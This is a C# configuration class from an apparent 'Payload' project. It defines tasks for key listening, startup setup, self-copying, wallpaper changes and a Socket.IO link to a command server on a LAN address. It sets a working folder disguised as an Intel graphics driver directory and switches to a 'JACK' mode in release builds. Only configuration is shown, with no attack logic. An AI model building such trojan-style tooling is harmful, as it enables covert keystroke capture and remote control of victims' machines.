using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Text;
using System.Threading.Tasks;
using static System.Environment;

namespace Payload.Common
{
    public class Config
    {
        #region Singleton
        private Config() 
        {
            Init();
        }
        private static Config instance = null;
        public static Config Instance
        {
            get
            {
                if (instance == null)
                {
                    instance = new Config();
                }
                return instance;
            }
        }
        #endregion        

        public void Init()
        {
            //System.AppDomain.CurrentDomain.FriendlyName // filename with extension
            //System.Diagnostics.Process.GetCurrentProcess().ProcessName // without extension
            //System.Diagnostics.Process.GetCurrentProcess().MainModule.FileName // the full path and filename with extension
            WorkSpaceDir = Directory.GetCurrentDirectory();
            ExeName = System.AppDomain.CurrentDomain.FriendlyName;
            ExeFullName = $"{WorkSpaceDir}\\{ExeName}";
            TargetWorkSpaceDir = $"{System.Environment.GetFolderPath(SpecialFolder.CommonApplicationData)}\\Intel\\Drivers\\Graphics";
            if(!Directory.Exists(TargetWorkSpaceDir))
                Directory.CreateDirectory(TargetWorkSpaceDir);            
        }

        public static bool IsRelease(Assembly assembly)
        {
            object[] attributes = assembly.GetCustomAttributes(typeof(DebuggableAttribute), true);
            if (attributes == null || attributes.Length == 0)
                return true;

            var d = (DebuggableAttribute)attributes[0];
            if ((d.DebuggingFlags & DebuggableAttribute.DebuggingModes.Default) == DebuggableAttribute.DebuggingModes.None)
                return true;

            return false;
        }

        public static bool IsDebug(Assembly assembly)
        {
            object[] attributes = assembly.GetCustomAttributes(typeof(DebuggableAttribute), true);
            if (attributes == null || attributes.Length == 0)
                return true;

            var d = (DebuggableAttribute)attributes[0];
            if (d.IsJITTrackingEnabled) return true;
            return false;
        }

        #region Enum
        public enum EnumTask
        {
            Demo,
            WallpaperEngine,
            SocketIO,
            KeyListener,
            ShowStarMenu,
            StartupSetup,
            CopyItself
        }

        public enum EnumTaskPackMode
        {
            NONE,
            AUTO,
            ONCE,
            EXIT
        }

        public enum EnumAppMode
        {
            NONE,
            DEBUG,
            JACK
        }
        #endregion

        #region Global
        public string WorkSpaceDir;
        public string TargetWorkSpaceDir;
        public string ExeName;
        public string ExeFullName;
        public int MainSleepInterval = 5 * 1000;
        public EnumAppMode AppMode = Config.IsDebug(Assembly.GetExecutingAssembly())?EnumAppMode.DEBUG:EnumAppMode.JACK;
        #endregion

        #region Class CommandManager

        #endregion

        #region Class WallpaperEngineCommand
        public long WallpaperEngineCommandDefaultInterval = 5 * 1000;
        public string WallpaperEngineCommandImageDir = @"Resources\Image\Wallpaper";

        #endregion

        #region Class WallpaperEngineFactory
        public long WallpaperEngineFactoryInitInterval = 5 * 1000;
        #endregion

        #region Class SocketIOClientCommand
        public long SocketIOClientCommandDefaultInterval = 60 * 1000;
        public string SocketIOClientCommandServerHost = "http://192.168.88.221:5556"; // "http://192.168.88.240:5000" "http://192.168.88.221:55699" "http://127.0.0.1:55699"
        #endregion
    }
}
